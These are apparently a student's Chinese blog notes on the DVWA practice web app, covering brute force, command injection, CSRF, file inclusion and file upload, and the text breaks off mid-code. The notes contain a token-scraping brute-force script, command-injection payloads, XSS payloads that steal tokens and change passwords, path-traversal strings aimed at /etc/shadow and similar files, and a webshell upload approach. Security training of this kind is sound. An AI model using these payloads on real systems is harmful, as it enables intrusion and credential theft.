        <content type="html"><![CDATA[<p>整理一下之前的DVWA笔记，并对相关知识进行补充</p><a id="more"></a><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>这个漏洞没有太多技巧，<strong>熟练的掌握 Burp suite</strong> 即可…</p><p>还有就是之前开了代理却发现 burp suite抓不到包，很尴尬的发现自己配置代理服务器时使用的是localhost禁止使用代理…删去配置则解决。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>这里需要注意的地方是，当传入的参数没有被过滤的时候，<strong>sql注入是可行的</strong><br><img src="/.com//0.png" alt></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>相比于Low级别的代码，Medium新增了一个函数来过滤一些字符串，过滤了单双引号，基本上抵制住了sql的攻击<br>但是还是可以爆破登录。但由于下面的sleep函数，登录失败会休眠2秒，</p><p><code>mysql_real_escape_string()</code><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">PHP mysql_real_escape_string() 函数</a></p><p><img src="/.com//1.png" alt></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>high级别相比于之前两种要麻烦得多。medium抵御了sql注入。high甚至还抵御了直接爆破。因为high加上了一个叫token的参数，想要爆破成功，就必须获得每次登陆的一个随机token值，服务器在这里应该会先对token进行检查随后再执行SQL查询。</p><p><img src="/.com//6.png" alt></p><p><a href="https://blog.csdn.net/u014418064/article/details/78565992" target="_blank" rel="noopener">Json Web Token 简介</a></p><p><a href="https://blog.csdn.net/tennysonsky/article/details/70337833" target="_blank" rel="noopener">Token验证介绍</a></p><p><a href="https://blog.csdn.net/Jason_Fangh/article/details/55113627" target="_blank" rel="noopener">token是什么</a></p><p>转载一个网上流程很清晰的图…<br><img src="/.com//2.png" alt></p><p>分析源码如下：<br><img src="/.com//3.png" alt></p><p>需要弄一个抓取token的脚本，由于我暂时不会，从网上大神那贴个脚本源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">header=&#123;        <span class="string">'Host'</span>: <span class="string">'192.168.153.130'</span>,</span><br><span class="line"><span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line"><span class="string">'If-None-Match'</span>: <span class="string">"307-52156c6a290c0"</span>,</span><br><span class="line"><span class="string">'If-Modified-Since'</span>: <span class="string">'Mon, 05 Oct 2015 07:51:07 GMT'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'</span>&#125;</span><br><span class="line">requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></span><br><span class="line">req = urllib2.Request(url=requrl,headers=header)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line"><span class="keyword">print</span> response.getcode(),</span><br><span class="line">the_page = response.read()</span><br><span class="line"><span class="keyword">print</span> len(the_page)</span><br><span class="line">soup = BeautifulSoup(the_page,<span class="string">"html.parser"</span>)</span><br><span class="line">user_token = soup.form.input.input.input.input[<span class="string">"value"</span>] <span class="comment">#get the user_token</span></span><br><span class="line"><span class="keyword">return</span> user_token</span><br><span class="line"> </span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"rkolin.txt"</span>):</span><br><span class="line">requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span>+<span class="string">"?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</span><br><span class="line">i = i+<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> i,<span class="string">'admin'</span>,line.strip(),</span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">10</span>):</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p><img src="/.com//4.png" alt><br><img src="/.com//5.png" alt></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><ul><li><p>对于修改数据和登陆表单提交使用 POST 方式，同时数据通过 POST 方式读取</p></li><li><p>添加随机 token 预防 csrf 攻击</p></li><li><p>针对登陆功能可添加图形验证码，每提交一次数据，验证码改变一次，验证功能在服务<br>端进行</p></li><li><p>针对登陆次数进行限制，可使用登陆远程 IP 或用户名两种方式进行锁定，登录错误次5 分钟之内超过 3 次锁定 1-3 小时</p></li><li><p>对于管理类系统配置登陆用户允许的 IP 范围</p></li><li><p>可使用短信验证和邮箱验证方式实现双因子认证，注意对短信轰炸和邮件轰炸的防御</p></li><li><p>密码等敏感字段进行加密后传输，例如密码使用加盐 hash 算法等加密后</p></li></ul><p><br><br></p><h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>这个漏洞记录的比较简略，一是DVWA这个漏洞没有多讲什么东西。二是由于系统的命令还不熟悉。之后的专项漏洞学习再对此漏洞进行补充…</p><p><strong>payload：</strong></p><ul><li><p>127.0.0.1&amp;&amp;id</p></li><li><p>127.0.0.1&amp;&amp;net user</p></li><li><p>testcmdinjection||id</p></li><li><p>testcmdinjection||net user</p></li><li><p>127.0.0.1&amp;id</p></li><li><p>127.0.0.1|net user</p></li><li><p>testcmdinjection&amp;id</p></li><li><p>testcmdinjection|net us</p></li></ul><pre><code>常用命令ipconfig 查看本地网络net  user   查看系统用户dir  查看当前目录find 查找包含指定字符的行whoami 查看系统当前有效用户名</code></pre><p><strong>需要注意的：</strong></p><ol><li><p>这个漏洞需要充分掌握py脚本（话说py脚本还是真的能干挺多事儿…）</p></li><li><p>还有就是注意过滤了哪些东西，哪些没有被过滤。找到可以替代的就可以绕过</p></li></ol><p><strong>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</strong></p><ul><li><p>Command 1&amp;&amp;Command 2<br>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p></li><li><p>Command 1&amp;Command 2<br>先执行Command 1，不管是否成功，都会执行Command 2</p></li><li><p>Command 1 | Command 2<br>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p></li></ul><p><br><br></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><strong>附上几篇不错的文章：</strong></p><p><a href="https://www.freebuf.com/column/184589.html" target="_blank" rel="noopener">骚姿势：当XSS与CSRF相遇</a></p><p><a href="https://www.freebuf.com/column/151816.html" target="_blank" rel="noopener">各大SRC中的CSRF技巧</a></p><p><a href="https://www.freebuf.com/column/155800.html" target="_blank" rel="noopener">Web安全 — CSRF漏洞 </a></p><p>需要用到的工具还是 Burp suite </p><p><strong>想到了某公司的一个面试题是如何避免CSRF，我觉得检验referer和token就是不错的方法，包括下面几个级别里面也都有提到</strong></p><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>分析一波源码如下，传入参数没有防护机制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input，通过GET进行了一波传参</span></span><br><span class="line">$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match? 判断两者是否相等</span></span><br><span class="line"><span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line">$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>], $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database，更新数据，改为新密码</span></span><br><span class="line">$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ?$___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>通过 Burp suite 进行CSRF攻击…具体流程就不必详说了，都是基本操作哈…</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>诱导用户点击构造之后的URL。该url即可实现密码修改。但是一定要注意，我们需要服务器验证cookie，所以我们必须让该<strong>url和DVWA系统打开的浏览器一致</strong></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>Medium源码相比于Low源码，在第一个if上检测了referer头信息，来源必须为网站地址。</p><p>针对请求来源使用 http referrer 头信息进行检查，但是检查逻辑存在问题，检查逻辑为<br>在 referer 中查找服务器名称，若查找到则成功，否则失败…</p><p><img src="/.com//7.png" alt></p><p>burp suite抓个包查看一下<br><img src="/.com//8.png" alt></p><p>然后使用burp suite 相关的功能即可…但是需要注释掉这一语句<a href="https://www.studyscript.com/Post/index/id/3018.html?page=3" target="_blank" rel="noopener">history对象history.pushState()</a><br><img src="/.com//9.png" alt></p><p>medium绕过的精华就在于通过构造其他地方的东西的名字，来绕过字符串的匹配，他原本是想匹配host里面的东西，但是host的名称可以被其他东西构造在referer里面去。</p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>High级别的源码跟Medium差不多，但是Medium是检测的referer，high是检测的token（话说token真是个比较难绕的东西）<br>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。<br>就不贴全部的源码了贴个前面的关键句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure><p>绕过思路比较清奇…<strong>借助了反射型的XSS</strong></p><p>这里直接借助红日安全实验室的payload：</p><ol><li><p>反射性 XSS 漏洞利用payload: <code>&lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p></li><li><p>通过反射型 XSS 获取修改密码表单 user_token  payload: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"../csrf/"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">onload</span>=<span class="string">"alert(frames[0].document.getElementsByName('user_token')[0].value)"</span>&gt;</span><span class="tag">&lt;/<span class="name">ifra</span></span></span><br><span class="line"><span class="tag"><span class="attr">me</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>利用反射性 XSS 自动提交修改密码表单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"../csrf"</span> onload=<span class="string">"var </span></span><br><span class="line"><span class="string">t=frames[0].document.getElementsByName('user_token')[0].value,x=new </span></span><br><span class="line"><span class="string">XMLHttpRequest();x.open('GET', </span></span><br><span class="line"><span class="string">'../csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_toke</span></span><br><span class="line"><span class="string">n='+t, null);x.send()"</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></li><li><p>发起攻击连接<br><code>http://localhost/DVWA-1.9/vulnerabilities/xss_r/?name=%3Ciframe+src%3D%22..%2Fcsrf%22+onload%3D%22var+t%3Dframes%5B0%5D.document.getElementsByName%28测试平台分析%27user_token%27%29%5B0%5D.value%2Cx%3Dnew+XMLHttpRequest%28%29%3Bx.open%28%27GET%27%2C+%27..%2Fcsrf%2F%3Fpassword_new%3Dtest123%26password_conf%3Dtest123%26Change%3DChange%26user_token%3D%27%2Bt%2C+null%29%3Bx.send%28%29%22%3E%3C%2Fiframe%3</code></p></li></ol><p><a href="https://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">或者借助Freebuf的payload：</a>：<a href="https://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/118352.html</a></p><p><strong>一些关于跨域问题的东西</strong><br><a href="https://blog.csdn.net/xuaman/article/details/54340290" target="_blank" rel="noopener">浅谈CSRF攻击-跨域攻击</a></p><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><p>附上源码<br><img src="/.com//10.png" alt></p><p><a href="https://blog.51cto.com/12332766/2137035" target="_blank" rel="noopener">一个博主写的PDO技术防范SQL注入的方法</a>：<a href="https://blog.51cto.com/12332766/2137035" target="_blank" rel="noopener">https://blog.51cto.com/12332766/2137035</a></p><h2 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><ul><li><p>对于修改数据和登陆表单提交使用 POST 方式，同时数据通过 POST 方式读取</p></li><li><p>添加随机 token 预防 csrf 攻击</p></li><li><p>对提交的请求进行 referer 验证，验证规则请求 referer 必须以 http(s)://host:port/开头</p></li><li><p><strong>针对修改密码，需要输入原密码进行验证</strong>（简单粗暴）</p></li><li><p>可添加验证码进行用户确认（有效防止无脑爆破）</p></li></ul><p><br><br></p><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><p>一个文件包含漏洞的基础链接：<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">Web安全实战系列：文件包含漏洞 </a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">l3m0n师傅-文件包含漏洞小结</a></p><p><strong>文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong></p><p><strong>本章不谈payload，只讲绕过方法。</strong></p><p><strong>常见的敏感信息路径：</strong></p><ul><li><strong>Windows系统</strong></li></ul><blockquote><ul><li>c:\boot.ini // 查看系统版本</li><li>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</li><li>c:\windows\repair\sam // 存储Windows系统初次安装的密码</li><li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li><li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li><li>c:\windows\php.ini // php 配置信息</li></ul></blockquote><ul><li><strong>Linux/Unix系统</strong></li></ul><blockquote><ul><li>/etc/passwd // 账户信息</li><li>/etc/shadow // 账户密码文件</li><li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li><li>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</li><li>/usr/local/app/php5/lib/php.ini // PHP相关配置</li><li>/etc/httpd/conf/httpd.conf // Apache配置文件</li><li>/etc/my.conf // mysql 配置文件</li></ul></blockquote><p><strong>PHP 带有很多内置 URL 风格的封装协议</strong>，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。<br><img src="/.com//13.png" alt></p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><p>附上简短的源码…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><ul><li><p>kali下<code>../../../../../../../../../../etc/password</code></p></li><li><p>Windows下<code>c:\\windows\win.ini</code><br>Windows下是找到网站根目录下配置的php.ini文件</p></li></ul><p><strong>远程文件包含</strong><br>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// str_replace对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>str_replace 函数直接双写就可以绕过</p></li><li><p>同时可以采用绝对链接，str_replace就替换不了</p></li></ol><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line"><span class="comment">// This isn't the page we want!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对提交参数进行检查，只允许 include.php 以及 file 开头的文件被包含，只能包含本地file 开头的文件或配合文件上传漏洞组合进行利用</p><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123;</span><br><span class="line"><span class="comment">// This isn't the page we want!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件只能是这三种，全部罗列出来了…</p><h2 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><ul><li><p>使用白名单列表限制被包含文件</p></li><li><p>关闭远程文件包含功能</p></li><li><p>避免 web 服务器启动用户权限过高</p></li></ul><p><br><br></p><h1 id="File-File-Upload"><a href="#File-File-Upload" class="headerlink" title="File File Upload"></a>File File Upload</h1><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line">$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知</p><p>之后直接上传带一句话木马的php文件然后用菜刀连接就ok</p><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p><img src="/.com//14.png" alt></p><ol><li><p>burpsuite直接抓包修改，可以绕过文件的类型的限制，而且本身只上传一句话木马，大小不会被过滤的内容所限制</p></li><li><p>组合拳，文件包含加文件上传。用菜刀连接的时候，一开始传递了参数，但是菜刀连接不上，因为它把上传的木马当做图片进行解析，然后返回了值。我们用文件包含获取相关权限就ok</p></li></ol><ol start="3"><li>截断绕过规则，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。</li></ol><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line">$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span 